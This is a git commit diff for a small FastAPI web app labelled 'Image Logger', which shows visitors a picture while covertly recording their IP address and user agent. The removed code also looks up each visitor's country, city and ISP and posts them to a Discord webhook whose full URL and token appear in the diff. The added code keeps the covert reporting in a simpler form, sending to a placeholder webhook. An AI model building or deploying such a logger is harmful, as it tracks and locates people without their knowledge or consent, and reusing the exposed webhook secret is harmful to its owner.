c3c2342a19491e826409d3379b963066c1e03553
chrxmezzz <adobrzanski07@gmail.com>
2026-04-03 22:16:09 +0200

    Update main.py

--- api/main.py
+++ api/main.py
@@ -1,97 +1,33 @@
 from fastapi import FastAPI, Request
-from fastapi.responses import HTMLResponse, RedirectResponse
+from fastapi.responses import HTMLResponse
 import requests
-import base64
-from urllib import parse
 
 app = FastAPI()
 
-config = {
-    "webhook": "https://discord.com/api/webhooks/1489273954274119932/exL5TnsOQlbusCZFDdW7jQEN6Pr8y76nvGadZ2Co0r6wuwLFLHGJa66Vz5w1PoiBbdiE",
-    "image": "https://ichef.bbci.co.uk/ace/standard/976/cpsprodpb/F1F2/production/_118283916_b19c5a1f-162b-410b-8169-f58f0d153752.jpg",
-    "imageArgument": True,
-}
+WEBHOOK = "YOUR_WEBHOOK"
 
-def makeReport(ip, useragent=None, endpoint="/", url=None):
-    try:
-        info = requests.get(f"http://ip-api.com/json/{ip}").json()
-
-        embed = {
-            "username": "Image Logger",
-            "content": "",
-            "embeds": [
-                {
-                    "title": "IP Logged",
-                    "description": f"""
-**IP:** {ip}
-**Country:** {info.get('country')}
-**City:** {info.get('city')}
-**ISP:** {info.get('isp')}
-
-**User Agent:**
-{useragent}
-""",
-                }
-            ],
-        }
-
-        if url:
-            embed["embeds"][0]["thumbnail"] = {"url": url}
-
-        requests.post(config["webhook"], json=embed)
-
-    except Exception as e:
-        print("Error:", e)
-
-
-def get_client_ip(request: Request):
+def get_ip(request: Request):
     forwarded = request.headers.get("x-forwarded-for")
     if forwarded:
         return forwarded.split(",")[0]
     return request.client.host
 
-
 @app.get("/")
 async def root(request: Request):
-    ip = get_client_ip(request)
+    ip = get_ip(request)
     useragent = request.headers.get("user-agent")
 
-    # Handle image override
-    url = config["image"]
-    if config["imageArgument"]:
-        query = dict(parse.parse_qsl(str(request.url.query)))
-        if "url" in query:
-            try:
-                url = base64.b64decode(query["url"]).decode()
-            except:
-                pass
+    try:
+        requests.post(WEBHOOK, json={
+            "content": f"IP: {ip}\nUA: {useragent}"
+        })
+    except:
+        pass
 
-    # Log request
-    makeReport(ip, useragent, "/", url)
-
-    html = f"""
+    return HTMLResponse("""
     <html>
-        <body style="margin:0">
-            <div style="
-                background-image:url('{url}');
-                background-size:contain;
-                background-repeat:no-repeat;
-                background-position:center;
-                width:100vw;
-                height:100vh;">
-            </div>
-        </body>
+    <body style="margin:0">
+        <img src="https://placekitten.com/800/600" style="width:100%;height:100%;object-fit:contain;">
+    </body>
     </html>
-    """
-
-    return HTMLResponse(content=html)
-
-
-@app.get("/image")
-async def image(request: Request):
-    ip = get_client_ip(request)
-    useragent = request.headers.get("user-agent")
-
-    makeReport(ip, useragent, "/image")
-
-    return RedirectResponse(config["image"])
+    """)
